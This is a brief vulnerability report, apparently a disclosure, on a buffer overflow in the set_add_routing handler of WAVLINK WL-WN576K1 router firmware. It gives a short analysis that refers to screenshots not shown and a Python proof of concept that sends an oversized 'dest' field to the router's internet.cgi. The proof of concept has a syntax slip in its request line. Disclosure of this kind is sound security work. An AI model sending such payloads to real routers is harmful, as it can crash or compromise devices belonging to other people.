# buff overflow

## WAVLINK_WL_WN576K1

version: 20220801

## Description:

There is a buff overflow in internet.cgi/set_add_routing

## Source:

you may download it from : 

[WL-WN576K1 - WAVLINK See the world! Powered by Wavlink](https://www.wavlink.com/en_us/firmware/details/5ce8519bd8.html)

 Analyse:

![](7.png)

get value from dest, and set hostnet with 'net'

![](8.png)

finally call strcat, cause buff overflow

## POC

```
url = "http://192.168.0.1/cgi-bin/internet.cgi"
payload = 'a'*0x1000 + '\n'

r = requests.post(url, data={ 'page':'addrouting', 'dest': + payload,'hostnet':'net'})
```
